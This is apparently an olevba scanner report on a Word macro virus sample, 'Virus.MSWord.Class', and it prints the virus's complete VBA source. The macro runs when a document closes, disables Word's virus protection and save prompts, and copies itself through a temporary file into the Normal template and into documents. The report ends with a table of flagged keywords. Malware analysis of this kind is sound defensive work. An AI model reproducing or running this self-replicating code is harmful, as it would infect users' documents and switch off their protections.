olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-835a7545814026d71b4d42987aded72da8b449b0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-835a7545814026d71b4d42987aded72da8b449b0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'5of912/17/98 4:18:53 PMwlogoatClippit
On Error GoTo out
'5of912/17/98 4:18:53 PMwlogoatClippit
Options.VirusProtection = False
'5of912/17/98 4:18:53 PMwlogoatClippit
Options.SaveNormalPrompt = False
'5of912/17/98 4:18:53 PMwlogoatClippit
Options.ConfirmConversions = False
'5of912/17/98 4:18:53 PMwlogoatClippit
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'5of912/17/98 4:18:53 PMwlogoatClippit
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'5of912/17/98 4:18:53 PMwlogoatClippit
If nt > 70 And ad > 0 Then GoTo out
'5of912/17/98 4:18:53 PMwlogoatClippit
If nt < 70 Then
'5of912/17/98 4:18:53 PMwlogoatClippit
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'5of912/17/98 4:18:53 PMwlogoatClippit
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'5of912/17/98 4:18:53 PMwlogoatClippit
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'5of912/17/98 4:18:53 PMwlogoatClippit
End If
'5of912/17/98 4:18:53 PMwlogoatClippit
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'5of912/17/98 4:18:53 PMwlogoatClippit
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'5of912/17/98 4:18:53 PMwlogoatClippit
host.codemodule.AddFromFile ("c:\class.sys")
'5of912/17/98 4:18:53 PMwlogoatClippit
With host.codemodule
'5of912/17/98 4:18:53 PMwlogoatClippit
    For x = 1 To 4
'5of912/17/98 4:18:53 PMwlogoatClippit
    .deletelines 1
'5of912/17/98 4:18:53 PMwlogoatClippit
    Next x
'5of912/17/98 4:18:53 PMwlogoatClippit
End With
'5of912/17/98 4:18:53 PMwlogoatClippit
If nt < 70 Then
'5of912/17/98 4:18:53 PMwlogoatClippit
    With host.codemodule
'5of912/17/98 4:18:53 PMwlogoatClippit
    .replaceline 1, "Sub AutoClose()"
'5of912/17/98 4:18:53 PMwlogoatClippit
    .replaceline 71, "Sub ToolsMacro()"
'5of912/17/98 4:18:53 PMwlogoatClippit
    End With
'5of912/17/98 4:18:53 PMwlogoatClippit
End If
'5of912/17/98 4:18:53 PMwlogoatClippit
With host.codemodule
'5of912/17/98 4:18:53 PMwlogoatClippit
    For x = 2 To 72 Step 2
'5of912/17/98 4:18:53 PMwlogoatClippit
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'5of912/17/98 4:18:53 PMwlogoatClippit
    Next x
'5of912/17/98 4:18:53 PMwlogoatClippit
End With
'5of912/17/98 4:18:53 PMwlogoatClippit
out:
'5of912/17/98 4:18:53 PMwlogoatClippit
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'5of912/17/98 4:18:53 PMwlogoatClippit
End Sub
'5of912/17/98 4:18:53 PMwlogoatClippit
Sub ToolsMacro()
'5of912/17/98 4:18:53 PMwlogoatClippit
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

